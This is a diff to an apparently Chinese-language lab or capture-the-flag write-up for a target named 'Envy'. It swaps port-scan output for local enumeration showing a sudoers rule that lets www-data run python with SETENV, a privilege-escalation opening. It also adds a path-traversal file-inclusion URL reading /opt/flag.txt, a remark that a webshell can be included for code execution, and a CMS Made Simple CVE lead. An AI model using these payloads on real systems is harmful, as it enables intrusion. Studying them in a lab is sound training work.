@@ -1,23 +1,55 @@
 # Envy
 
-## 信息搜集
+## 信息收集
 
-```plaintext
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
-|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
-|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
-80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-generator: CMS Made Simple - Copyright (C) 2004-2022. All rights reserved.
-|_http-title: Home - Envy
-8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-title: PetLover - Pet Care Website Template
-|_Requested resource was index.php?page=index.html
+```bash
+Detected ss and lsof, executing related commands...
+Port: 53, PID: 720
+—> Command: /lib/systemd/systemd-resolved 
+Port: 22, PID: 923
+—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
+Port: 33060, PID: 1069
+—> Command: /usr/sbin/mysqld 
+Port: 3306, PID: 1069
+—> Command: /usr/sbin/mysqld 
+
+## ———————————————————————————— ##
+
+Nginx is not installed.
+
+## ———————————————————————————— ##
+
+Detected apache, analyzing its configuration...
+Device "eth0" does not exist.
+
+Unique Hosts:
+
+
+## ———————————————————————————— ##
+
+Checking /etc/sudoers (active configurations only):
+  Defaults      env_reset
+  Defaults      mail_badpass
+  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+  root  ALL=(ALL:ALL) ALL
+  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py
+  %admin ALL=(ALL) ALL
+  %sudo ALL=(ALL:ALL) ALL
+———
+Finding SUID files:
+  root  ALL=(ALL:ALL) ALL
+  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py
+  %admin ALL=(ALL) ALL
+  %sudo ALL=(ALL:ALL) ALL
+———
+Finding files with special capabilities:
+  /snap/core20/1376/usr/bin/ping = cap_net_raw+ep
+  /snap/core20/1405/usr/bin/ping = cap_net_raw+ep
+  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+  /usr/bin/ping = cap_net_raw+ep
+  /usr/bin/mtr-packet = cap_net_raw+ep
+  /usr/bin/traceroute6.iputils = cap_net_raw+ep
+———
 ```
 
 ## http 80 目录扫描
@@ -79,4 +111,18 @@ $config['db_name'] = 'cmsms';
 $config['db_prefix'] = 'cms_';
 $config['timezone'] = 'UTC';
 ?>
+```
+
+## Port 8080 LFI
+
+```plaintext
+http://10.10.110.102:8080/index.php?page=../../../../opt/flag.txt
+```
+
+顺便包含一个 webshell 上去就能 rce
+
+## Port 80 SimpleCMS 命令执行 可能
+
+```plaintext
+Simple v2.2.15 远程命令执行漏洞(CVE-2022-23906)
 ```
